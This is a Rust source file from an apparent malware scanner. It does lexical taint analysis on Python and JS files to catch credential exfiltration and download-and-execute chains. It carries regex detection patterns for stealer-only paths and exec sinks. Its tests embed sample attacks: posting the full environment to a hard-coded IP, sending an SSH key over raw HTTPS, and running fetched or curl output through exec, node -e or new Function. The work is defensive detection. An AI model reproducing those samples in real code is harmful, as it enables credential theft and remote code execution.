//! Variable-level data flow inside one file (Python, JS/TS): a secret that
//! reaches a network call, and downloaded content that reaches an
//! interpreter. The proximity chains in correlate.rs miss both once the read
//! and the send sit far apart or a few assignments away.
//!
//! Lexical, like zipslip.rs. The file is cut into statements at newlines and
//! `;`, a statement running on while a bracket is open (a multi-line dict
//! literal is one statement; a JS block brace is not). Statements are read
//! in order: an assignment, a mutation (`x.update(..)`, `x[k] = ..`,
//! `x.k = ..`) or a binding (`with .. as x`, `for x in ..`) passes taint from
//! its right side to the name on its left, and a later sink reports when its
//! arguments carry taint. Bundles are left to the proximity chains: a large
//! or minified file is skipped.
//!
//! shortcut: one namespace per file and no scopes, so two functions that
//! reuse a name share its taint, and data passed through a call is lost.
//! Move to a real parser (tree-sitter) if that over- or under-reaches. A
//! first version that ignored statement order flagged 53 of 526 clean
//! packages (`process.env` in a fork option, then an unrelated `.send()`).

use crate::correlate::{CREDENTIAL_EXFIL, DOWNLOAD_EXECUTE};
use crate::RuleMatch;
use regex::Regex;
use std::collections::HashMap;
use std::sync::LazyLock;

#[derive(Clone, Copy, PartialEq, Eq, Hash, Debug)]
enum Kind {
    /// The whole environment, an SSH key, a browser or wallet store.
    Secret,
    /// A response body or the output of `curl`.
    Download,
}

/// Where a taint came from, for the finding's context.
#[derive(Clone)]
struct Origin {
    line: usize,
    what: String,
}

struct Stmt {
    line: usize,
    text: String,
}

/// Paths only a stealer reads. Not `~/.aws/credentials`, `.npmrc` or
/// `.netrc`: SDKs and package managers read those to sign their own requests.
static SECRET_PATH: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?i)(?:\.ssh/|id_rsa|id_ed25519|id_ecdsa|Login Data|Local State|Local Storage/leveldb|wallet\.dat|\.electrum|Exodus/|\.git-credentials|keychain-db)"#)
        .unwrap()
});

static DOWNLOAD_SRC: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?:(?:^|\W)urlopen\s*\(|requests\.(?:get|post|request)\s*\(|httpx\.(?:get|post|stream)\s*\(|(?:^|[^\w.])fetch\s*\(|axios(?:\.(?:get|post|request))?\s*\(|https?\.get\s*\(|(?:^|[^\w.])got\s*\(|["'](?:curl|wget)["']|["'`](?:curl|wget)\s)"#)
        .unwrap()
});

static NET_SINK_PY: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?:requests\.(?:post|put|patch|request|get)|(?:^|\W)urlopen|\.(?:post|put|patch|request|sendall|sendto|sendmail|send_message)|gethostbyname|getaddrinfo)\s*\("#)
        .unwrap()
});
/// Named network APIs only: `.send()` and `.post()` are IPC, Express
/// responses and router methods far more often than requests.
static NET_SINK_JS: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?:(?:^|[^\w.])fetch|axios(?:\.(?:post|put|patch|request|get))?|sendBeacon|(?:^|[^\w.])got(?:\.\w+)?|(?:^|[^\w.])needle|dns\.(?:lookup|resolve\w*))\s*\("#)
        .unwrap()
});

/// `req.write(data)` / `req.end(data)` send only when the file speaks raw HTTP.
static RAW_HTTP: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?:https?\.request|net\.(?:connect|Socket|createConnection)|tls\.connect)\s*\("#)
        .unwrap()
});
static STREAM_SINK: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"\.(?:write|end)\s*\("#).unwrap());

/// Not `eval`: Python's runs one expression, and scrapers misuse it to parse
/// responses (`eval(r.text)`); downloaded code goes through `exec`.
static CODE_SINK_PY: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?:(?:^|[^\w.])(?:exec|compile)|os\.system|os\.popen|subprocess\.\w+)\s*\("#)
        .unwrap()
});
static CODE_SINK_JS: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?:(?:^|[^\w.])eval|new\s+Function|(?:^|[^\w.])Function|vm\.run\w*|execSync|spawnSync|spawn|child_process\.exec)\s*\("#)
        .unwrap()
});
/// A subprocess call runs downloaded content only through an inline-code
/// flag (`node -e`, `python -c`) or a shell.
static INLINE_CODE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?:["'](?:node|python3?|bash|sh|zsh|perl|ruby|pwsh|powershell|cmd)(?:\.exe)?["']\s*,\s*["'](?:-e|-c|--eval|-Command|/c)["']|shell\s*=\s*True)"#)
        .unwrap()
});

static WITH_AS: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?:^|,)\s*(?:async\s+)?(?:with\s+)?(.+?)\s+as\s+([A-Za-z_]\w*)").unwrap()
});
static FOR_IN: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"^\s*for\s*\(?\s*(?:const|let|var)?\s*([\w$,\s\[\]{}]+?)\s+(?:in|of)\s+(.+)")
        .unwrap()
});
static MUTATE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"([A-Za-z_$][\w$]*(?:\.[A-Za-z_$][\w$]*)?)\.(?:update|append|extend|push|add|set|insert|setdefault)\s*\(").unwrap()
});
static IDENT: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"[A-Za-z_$][\w$]*(?:\.[A-Za-z_$][\w$]*)?").unwrap());

/// Chains for one file, `Chain: Credential Exfiltration` and `Chain: Download
/// and Execute`, the same names the proximity chains use.
pub fn flows(rel_path: &str, content: &str) -> Vec<RuleMatch> {
    let lower = rel_path.to_ascii_lowercase();
    let python = lower.ends_with(".py");
    let js = [".js", ".mjs", ".cjs", ".ts", ".jsx", ".tsx"]
        .iter()
        .any(|e| lower.ends_with(e));
    if !python && !js {
        return Vec::new();
    }
    // A 300 KB bundle chunk reuses `res` and `result` in hundreds of
    // functions (lerna); the scripts this is for are a few KB.
    const MAX_BYTES: usize = 64 * 1024;
    if content.len() > MAX_BYTES || content.lines().any(|l| l.len() > 4000) {
        return Vec::new();
    }
    let stmts = statements(content, python);
    let mut taint: HashMap<String, (Kind, Origin)> = HashMap::new();
    let raw_http = js && RAW_HTTP.is_match(content);
    let (net_sink, code_sink) = if python {
        (&*NET_SINK_PY, &*CODE_SINK_PY)
    } else {
        (&*NET_SINK_JS, &*CODE_SINK_JS)
    };
    let mut out: Vec<RuleMatch> = Vec::new();
    // In order: a sink sees only what earlier statements tainted.
    for s in &stmts {
        for (sink, kind, name) in [
            (net_sink, Kind::Secret, CREDENTIAL_EXFIL),
            (code_sink, Kind::Download, DOWNLOAD_EXECUTE),
        ] {
            if out.iter().any(|m| m.matched_pattern == name) {
                continue;
            }
            for m in sink.find_iter(&s.text) {
                let args = call_args(&s.text, m.end() - 1);
                if name == DOWNLOAD_EXECUTE
                    && m.as_str().contains("subprocess")
                    && !INLINE_CODE.is_match(args)
                {
                    continue;
                }
                if let Some((_, origin)) = carried(args, s.line, &taint, Some(kind)) {
                    out.push(flow(rel_path, name, &origin, s.line, m.as_str()));
                    break;
                }
            }
            if raw_http && kind == Kind::Secret && !out.iter().any(|m| m.matched_pattern == name) {
                for m in STREAM_SINK.find_iter(&s.text) {
                    let args = call_args(&s.text, m.end() - 1);
                    if let Some((_, origin)) = carried(args, s.line, &taint, Some(kind)) {
                        out.push(flow(rel_path, name, &origin, s.line, m.as_str()));
                        break;
                    }
                }
            }
        }
        for (targets, rhs) in bindings(&s.text) {
            if let Some((kind, origin)) = carried(rhs, s.line, &taint, None) {
                for t in targets {
                    taint.entry(t).or_insert((kind, origin.clone()));
                }
            }
        }
    }
    out
}

fn flow(rel_path: &str, name: &str, origin: &Origin, line: usize, sink: &str) -> RuleMatch {
    let sink = sink.trim_start_matches(|c: char| !c.is_alphanumeric() && c != '.');
    RuleMatch {
        file_path: rel_path.to_string(),
        line_number: line,
        matched_pattern: name.to_string(),
        severity: "critical".to_string(),
        context: format!(
            "data flow: {} (line {}) reaches {}) (line {})",
            origin.what, origin.line, sink, line
        ),
    }
}

/// The taint `text` carries: a source in it, or a tainted name it mentions.
/// `want`: only that kind (a sink); `None`: any, secrets first (a binding).
/// A download source inside a sink's own arguments is the sink running
/// `curl -o file`, not running what came back, so sinks need a variable.
fn carried(
    text: &str,
    line: usize,
    taint: &HashMap<String, (Kind, Origin)>,
    want: Option<Kind>,
) -> Option<(Kind, Origin)> {
    let wants = |k: Kind| want.is_none_or(|w| w == k);
    if wants(Kind::Secret) {
        if let Some(what) = secret_source(text) {
            return Some((Kind::Secret, Origin { line, what }));
        }
    }
    if want.is_none() {
        if let Some(m) = DOWNLOAD_SRC.find(text) {
            let what = m
                .as_str()
                .trim_start_matches(|c: char| !c.is_alphanumeric())
                .to_string();
            return Some((Kind::Download, Origin { line, what }));
        }
    }
    idents(text)
        .into_iter()
        .filter_map(|i| taint.get(&i).cloned())
        .find(|(k, _)| wants(*k))
}

/// The whole environment (not one variable of it), or a stealer-only path.
fn secret_source(text: &str) -> Option<String> {
    for env in ["os.environ", "process.env"] {
        for (i, _) in text.match_indices(env) {
            let after = text[i + env.len()..].trim_start();
            let one_var = after.starts_with('[')
                || (after.starts_with('.')
                    && ![".copy(", ".items(", ".values("]
                        .iter()
                        .any(|w| after.starts_with(w)));
            let word_before = text[..i]
                .chars()
                .next_back()
                .is_some_and(|c| c.is_alphanumeric() || c == '_');
            if !one_var && !word_before {
                return Some(env.to_string());
            }
        }
    }
    SECRET_PATH.find(text).map(|m| m.as_str().to_string())
}

/// `(targets, right side)` for each binding in one statement.
fn bindings(text: &str) -> Vec<(Vec<String>, &str)> {
    let mut out = Vec::new();
    if let Some((lhs, rhs)) = split_assignment(text) {
        // `const { HOME, CI } = process.env` picks variables, not the lot.
        let picks = lhs
            .trim()
            .trim_start_matches(|c: char| c.is_alphabetic() || c.is_whitespace())
            .starts_with('{');
        if !(picks && ["process.env", "os.environ"].contains(&rhs.trim().trim_end_matches(';'))) {
            out.push((targets(lhs), rhs));
        }
    }
    let head = text.trim_start();
    if head.starts_with("with ") || head.starts_with("async with ") {
        for c in WITH_AS.captures_iter(text) {
            out.push((vec![c[2].to_string()], c.get(1).unwrap().as_str()));
        }
    }
    if let Some(c) = FOR_IN.captures(text) {
        out.push((
            targets(c.get(1).unwrap().as_str()),
            c.get(2).unwrap().as_str(),
        ));
    }
    for c in MUTATE.captures_iter(text) {
        let target = base_name(&c[1]);
        if !NOT_VARIABLES.contains(&target.as_str()) {
            out.push((vec![target], call_args(text, c.get(0).unwrap().end() - 1)));
        }
    }
    out
}

/// Left and right side of a top-level `=` (also `+=`, `|=`, ...), skipping
/// `==`, `<=`, `>=`, `!=` and `=>`.
fn split_assignment(text: &str) -> Option<(&str, &str)> {
    let b = text.as_bytes();
    let mut depth = 0i32;
    for i in 0..b.len() {
        match b[i] {
            b'(' | b'[' | b'{' => depth += 1,
            b')' | b']' | b'}' => depth -= 1,
            b'=' if depth == 0 => {
                let next = b.get(i + 1).copied();
                let prev = if i > 0 { b[i - 1] } else { 0 };
                if next == Some(b'=')
                    || next == Some(b'>')
                    || matches!(prev, b'=' | b'<' | b'>' | b'!')
                {
                    continue;
                }
                return Some((&text[..i], &text[i + 1..]));
            }
            _ => {}
        }
    }
    None
}

/// Names a left side binds: `x`, `a, b`, `{a, b}`, `obj.k` / `obj[k]` (the
/// object), `self.k` / `this.k` (the attribute, not the whole object).
fn targets(lhs: &str) -> Vec<String> {
    let lhs = lhs
        .trim()
        .trim_end_matches(|c: char| "+-*/|&%^:".contains(c));
    let lhs = lhs.split(':').next().unwrap_or(lhs); // `x: Dict = ...`
    idents(lhs)
        .into_iter()
        .map(|n| base_name(&n))
        .filter(|n| !NOT_VARIABLES.contains(&n.as_str()))
        .collect()
}

/// Module and global objects: `os.environ.update(..)` or `sys.path.append(..)`
/// must not taint every later `os.` / `sys.` mention.
const NOT_VARIABLES: &[&str] = &[
    "os", "sys", "json", "re", "path", "process", "console", "Object", "JSON", "Math", "window",
    "document", "module", "exports", "require", "const", "let", "var", "global", "nonlocal",
    "export", "await", "return",
];

fn base_name(name: &str) -> String {
    match name.split_once('.') {
        Some(("self" | "this", _)) => name.to_string(),
        Some((base, _)) => base.to_string(),
        None => name.to_string(),
    }
}

/// Identifiers outside string literals, plus those inside f-string and
/// template interpolations. `self.x` / `this.x` stay dotted.
fn idents(text: &str) -> Vec<String> {
    let mut code = String::with_capacity(text.len());
    let mut chars = text.chars().peekable();
    let mut prev = ' ';
    while let Some(c) = chars.next() {
        if matches!(c, '"' | '\'' | '`') {
            let interpolates = c == '`' || matches!(prev, 'f' | 'F');
            let mut depth = 0;
            let mut escaped = false;
            for d in chars.by_ref() {
                if escaped {
                    escaped = false;
                } else if d == '\\' {
                    escaped = true;
                } else if depth == 0 && d == c {
                    break;
                } else if interpolates && d == '{' {
                    depth += 1;
                    code.push(' ');
                } else if interpolates && d == '}' && depth > 0 {
                    depth -= 1;
                    code.push(' ');
                } else if depth > 0 {
                    code.push(d);
                }
            }
            code.push(' ');
            prev = ' ';
            continue;
        }
        code.push(c);
        prev = c;
    }
    IDENT
        .find_iter(&code)
        .map(|m| {
            let s = m.as_str();
            match s.split_once('.') {
                Some(("self" | "this", _)) => s.to_string(),
                Some((base, _)) => base.to_string(),
                None => s.to_string(),
            }
        })
        .collect()
}

/// The argument text of the call whose `(` is at byte `open`.
fn call_args(text: &str, open: usize) -> &str {
    let mut depth = 0i32;
    for (i, c) in text[open..].char_indices() {
        match c {
            '(' => depth += 1,
            ')' => {
                depth -= 1;
                if depth == 0 {
                    return &text[open + 1..open + i];
                }
            }
            _ => {}
        }
    }
    &text[(open + 1).min(text.len())..]
}

/// Statements with their first line. Strings and comments are kept out of
/// the bracket count; a JS `{` after `)`, `=>` or a keyword opens a block and
/// separates statements instead of continuing one.
fn statements(content: &str, python: bool) -> Vec<Stmt> {
    const MAX_STMT: usize = 8 * 1024;
    let mut out = Vec::new();
    let mut cur = String::new();
    let (mut line, mut start) = (1, 1);
    let mut depth = 0i32;
    // Bracket depth outside each open JS block.
    let mut blocks: Vec<i32> = Vec::new();
    let mut quote: Option<char> = None;
    let mut chars = content.chars().peekable();
    let mut prev = '\0';
    let flush = |cur: &mut String, out: &mut Vec<Stmt>, start: usize| {
        if !cur.trim().is_empty() {
            out.push(Stmt {
                line: start,
                text: std::mem::take(cur),
            });
        }
        cur.clear();
    };
    while let Some(c) = chars.next() {
        if c == '\n' {
            line += 1;
        }
        if let Some(q) = quote {
            cur.push(if c == '\n' { ' ' } else { c });
            if c == q && prev != '\\' || (c == '\n' && q != '`' && !python) {
                quote = None;
            }
            prev = if prev == '\\' && c == '\\' { '\0' } else { c };
            continue;
        }
        // Comments: `#` in Python, `//` and `/* */` in JS.
        if (python && c == '#') || (!python && c == '/' && chars.peek() == Some(&'/')) {
            for d in chars.by_ref() {
                if d == '\n' {
                    line += 1;
                    if depth <= 0 {
                        flush(&mut cur, &mut out, start);
                        start = line;
                    }
                    break;
                }
            }
            prev = '\n';
            continue;
        }
        if !python && c == '/' && chars.peek() == Some(&'*') {
            let mut last = '\0';
            for d in chars.by_ref() {
                if d == '\n' {
                    line += 1;
                }
                if last == '*' && d == '/' {
                    break;
                }
                last = d;
            }
            continue;
        }
        match c {
            '"' | '\'' | '`' => {
                quote = Some(c);
                cur.push(c);
            }
            '{' if !python && is_block(&cur) => {
                flush(&mut cur, &mut out, start);
                start = line;
                blocks.push(depth);
                depth = 0;
            }
            '}' if depth == 0 => {
                flush(&mut cur, &mut out, start);
                start = line;
                depth = blocks.pop().unwrap_or(0);
            }
            '(' | '[' | '{' => {
                depth += 1;
                cur.push(c);
            }
            ')' | ']' | '}' => {
                if depth > 0 {
                    depth -= 1;
                    cur.push(c);
                } else {
                    flush(&mut cur, &mut out, start);
                    start = line;
                }
            }
            ';' | '\n' if depth <= 0 => {
                flush(&mut cur, &mut out, start);
                start = line;
            }
            '\n' => cur.push(' '),
            _ => cur.push(c),
        }
        if cur.len() > MAX_STMT {
            flush(&mut cur, &mut out, start);
            start = line;
            depth = 0;
        }
        prev = c;
    }
    flush(&mut cur, &mut out, start);
    out
}

/// A JS `{` that opens a block (function body, `if`, `try`) rather than an
/// object literal.
fn is_block(before: &str) -> bool {
    let t = before.trim_end();
    t.is_empty()
        || t.ends_with(')')
        || t.ends_with("=>")
        || ["else", "try", "finally", "do"]
            .iter()
            .any(|k| t.ends_with(k))
        || t.split_whitespace()
            .next()
            .is_some_and(|w| ["class", "function", "async"].contains(&w))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn names(path: &str, src: &str) -> Vec<String> {
        flows(path, src)
            .into_iter()
            .map(|m| m.matched_pattern)
            .collect()
    }

    #[test]
    fn environment_reaching_a_request_through_a_dict() {
        let src = r#"import os, json, urllib.request
def main():
    env_vars = os.environ
    data = {
        "host": "x",
        "env": dict(env_vars),
    }
    data.update({"kube": None})
    data_json = json.dumps(data).encode('utf-8')
    req = urllib.request.Request("http://54.242.228.151:8090/x", data=data_json)
    with urllib.request.urlopen(req) as response:
        response.read()
"#;
        let found = flows("pkg/__init__.py", src);
        assert_eq!(
            found.len(),
            1,
            "{:?}",
            found.iter().map(|m| &m.context).collect::<Vec<_>>()
        );
        assert_eq!(found[0].matched_pattern, CREDENTIAL_EXFIL);
        assert_eq!(found[0].line_number, 11);
        assert!(
            found[0].context.contains("os.environ (line 3)"),
            "{}",
            found[0].context
        );
    }

    #[test]
    fn downloaded_code_reaching_exec_or_node() {
        let py = "from urllib import request\nreq = request.Request(url)\nwith request.urlopen(req, timeout=10) as resp:\n    exec(resp.read(), mod.__dict__)\n";
        assert_eq!(names("m/__init__.py", py), vec![DOWNLOAD_EXECUTE]);
        let curl = "r = subprocess.run(['curl', '-s', 'https://x.github.io/p.js'], capture_output=True, text=True)\nif r.returncode == 0:\n    subprocess.run(['node', '-e', r.stdout], timeout=30)\n";
        assert_eq!(names("w/__init__.py", curl), vec![DOWNLOAD_EXECUTE]);
        let js = "async function go() {\n  const res = await fetch(u);\n  const code = await res.text();\n  new Function(code)();\n}\n";
        assert_eq!(names("index.js", js), vec![DOWNLOAD_EXECUTE]);
    }

    #[test]
    fn ssh_key_written_to_a_raw_https_request() {
        let js = "const https = require('https');\nconst key = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa'), 'utf8');\nconst body = JSON.stringify({ k: key });\nconst req = https.request(opts, () => {});\nreq.write(body);\nreq.end();\n";
        assert_eq!(names("lib/a.js", js), vec![CREDENTIAL_EXFIL]);
    }

    /// The clean packages the first version flagged (playwright,
    /// vscode-tailwindcss, delta-core, tvsd).
    #[test]
    fn clean_package_shapes_have_no_flow() {
        let ipc = "function start() {\n  const child = fork(server, [], { env: { ...process.env, PORT } });\n  child.send({ type: 'ready' });\n  res.send(body);\n}\n";
        assert!(names("dist/server.js", ipc).is_empty());
        let backward =
            "def run():\n    exec(code)\n\ndef fetch_code():\n    code = requests.get(URL).text\n";
        assert!(names("orchestrator.py", backward).is_empty());
        let scrape = "request = requests.get(search_url, params={'q': q})\nresults = list(eval(str(request.content, 'utf-8-sig')))\n";
        assert!(names("sources/x.py", scrape).is_empty());
        // todo-tree, pm2: running curl / wget is not running what they fetch.
        let fetch_tool = "execSync('curl -sL https://x.example/codicons.css -o codicons.css');\nspawn('wget', [url, '-O', dest]);\n";
        assert!(names("buildCodiconNames.js", fetch_tool).is_empty());
        // next: named variables picked out of the environment.
        let picked = "const { NEXT_TRACE_UPLOAD_DEBUG, NEXT_TRACE_UPLOAD_FULL } = process.env;\nawait fetch(url, { body: JSON.stringify({ full: NEXT_TRACE_UPLOAD_FULL }) });\n";
        assert!(names("trace-uploader.js", picked).is_empty());
    }

    #[test]
    fn ordinary_code_has_no_flow() {
        let py = r#"import os, subprocess, requests, re
env = os.environ.copy()
env["X"] = "1"
subprocess.run(cmd, env=env)
requests.post(url, json={"token": os.environ.get("TOKEN")})
exec(open("version.py").read())
r = requests.get(url)
version = re.compile(r"v(\d+)").match(r.text)
print("send os.environ to the server")  # data = os.environ
"#;
        assert!(
            names("setup.py", py).is_empty(),
            "{:?}",
            flows("setup.py", py)
        );
        let js = "const { spawn } = require('child_process');\nconst child = spawn('npm', ['test'], { env: { ...process.env, CI: '1' } });\nconst text = await (await fetch(u)).text();\nconst m = /x(\\d+)/.exec(text);\nfetch(api, { headers: { auth: process.env.TOKEN } });\n";
        assert!(names("a.js", js).is_empty(), "{:?}", flows("a.js", js));
    }
}
